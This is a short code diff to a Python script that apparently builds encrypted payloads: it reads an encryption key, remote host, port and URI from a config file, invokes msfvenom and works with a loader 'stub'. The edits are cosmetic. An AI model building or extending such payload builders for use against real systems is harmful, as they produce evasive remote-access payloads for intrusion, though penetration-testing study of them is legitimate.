@@ -17,7 +17,6 @@ def is_set(value):
     return value != None and value != ""
 
 ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
-ENCRYPTION_KEY = config.get("Payload", "encryption_key")
 
 STUB_FILE = config.get("Stub", "filename")
 
@@ -39,11 +38,11 @@ WORKING_FOLDER = "build/"
 
 
 def main():
-
     if config.get("Payload", "encryption_key") == "random":
         ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
     else:
         ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
+
 
     RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
     RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
@@ -71,6 +70,7 @@ def main():
             with open("build/payload.txt", "w") as f:
                 f.write(str(instructions))
         else:
+ 
             msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
         PAYLOAD_FILE = "payload.txt"
     else:
@@ -78,7 +78,7 @@ def main():
         sys.exit(1)
 
     print("===========CONFIG==========")
-    print(f"Encryption byte: {hex(ENCRYPTION_KEY)}")
+    # print(f"Encryption byte: {hex(ENCRYPTION_KEY)}")
     print(f"Payload : {PAYLOAD_FILE} {PAYLOAD_NAME}")
     print(f"RHOST : {RHOST}")
     print(f"RPORT : {RPORT}")
